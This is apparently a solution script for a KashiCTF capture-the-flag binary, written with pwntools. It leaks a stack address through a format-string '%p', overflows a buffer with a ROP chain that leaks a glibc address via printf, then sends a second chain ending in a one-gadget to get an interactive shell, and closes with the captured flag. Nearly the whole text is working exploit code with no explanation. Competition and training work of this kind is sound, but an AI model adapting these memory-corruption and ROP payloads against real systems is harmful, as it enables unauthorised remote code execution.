from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', './vuln'], '''
#     file vuln
#     ni
#     ni          
#     b *(troll+127)
#     b *(main+60)
#     b *(main+90)
#     # continue
# ''')

p = remote('kashictf.iitbhucybersec.in', 54468)

p.recvuntil(b'What do you want? ')
p.sendline(b'%p')
p.recvuntil(b'Lmao not giving you ')
saved_rbp_1 = int(p.recvuntil(b'\n').decode().strip()[0:14], 16) + 0x2170
log.info(f'saved_rbp_1: {hex(saved_rbp_1)}')

e = ELF('./vuln')
r = ROP('./vuln')
chain1 = [
    r.ret.address,
    e.plt.printf,
    0x401241
]
p.recvuntil(b'Wanna Cry about that? ')
payload1 = b'A' * 0x20 + p64(saved_rbp_1) + b''.join([p64(c) for c in chain1])
p.sendline(payload1)
p.recvuntil(b'Still not giving a shit bye hahaha')
glibc_base_addr = u64(p.recv(6).ljust(8, b'\x00')) - 0x51fd0
log.info(f'glibc_base_addr: {hex(glibc_base_addr)}')

p.recvuntil(b'What do you want? ')
p.sendline(b'%p')
p.recvuntil(b'Lmao not giving you ')
saved_rbp_2 = int(p.recvuntil(b'\n').decode().strip()[0:14], 16) + 0x2170
log.info(f'saved_rbp_2: {hex(saved_rbp_2)}')

glibc_r = ROP('./libc.so.6')
chain2 = [
    glibc_r.rdi.address + glibc_base_addr,  # pop rdi; ret
    0x0,    # NULL
    glibc_r.r13.address + glibc_base_addr,  # pop r13; ret
    0x0,    # NULL
    0xd511f + glibc_base_addr  # one gadget
]
p.recvuntil(b'Wanna Cry about that? ')
payload2 = b'A' * 0x20 + p64(saved_rbp_2+0x38) + b''.join([p64(c) for c in chain2])
p.sendline(payload2)

p.interactive()

# KashiCTF{did_some_trolling_right_there_Esr0S6xm}
